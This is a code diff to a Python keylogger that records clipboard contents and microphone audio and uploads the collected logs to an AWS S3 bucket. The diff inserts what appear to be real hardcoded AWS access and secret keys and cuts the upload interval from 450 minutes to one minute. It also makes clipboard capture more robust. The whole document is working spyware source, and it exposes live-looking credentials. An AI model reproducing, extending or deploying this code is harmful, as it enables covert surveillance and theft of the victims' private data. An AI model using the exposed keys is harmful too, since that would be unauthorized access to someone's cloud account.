@@ -22,8 +22,8 @@ import subprocess
 import sys
 
 # AWS Configuration (Use environment variables instead of hardcoding)
-AWS_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY", "XXXXXX")
-AWS_SECRET_KEY = os.getenv("AWS_SECRET_KEY", "XXX")
+AWS_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY", "AKIAX5ZI6TUHSYDHB36V")
+AWS_SECRET_KEY = os.getenv("AWS_SECRET_KEY", "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")
 AWS_BUCKET_NAME = os.getenv("AWS_BUCKET_NAME", "store-logs1")
 AWS_REGION = os.getenv("AWS_REGION", "us-east-1")
 
@@ -51,7 +51,7 @@ ZIP_FILE = os.path.join(LOG_DIR, "logs.zip")
 # Constants
 MICROPHONE_TIME = 10  # Duration of audio recording in seconds
 TIME_ITERATION = 15  # Time interval for keylogger in seconds
-UPLOAD_INTERVAL = 450 * 60  # Time interval for uploading files 
+UPLOAD_INTERVAL = 1 * 60  # Time interval for uploading files 
 
 # Logging setup
 logging.basicConfig(filename=os.path.join(LOG_DIR, "keylogger.log"), level=logging.INFO, format="%(asctime)s - %(message)s")
@@ -101,13 +101,19 @@ def capture_clipboard():
         win32clipboard.OpenClipboard()
         data = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
-        with open(CLIPBOARD_FILE, "a") as f:
+
+        with open(CLIPBOARD_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{time.ctime()}] Clipboard Data:\n{data}\n\n")
+
         logging.info("Clipboard data captured.")
     except Exception as e:
         logging.error(f"Clipboard capture error: {e}")
-        capture_clipboard()
-        
+    finally:
+        try:
+            win32clipboard.CloseClipboard()
+        except:
+            pass  # Ignore errors when trying to close
+
 
 ### FUNCTION TO RECORD AUDIO ###
 def record_audio():
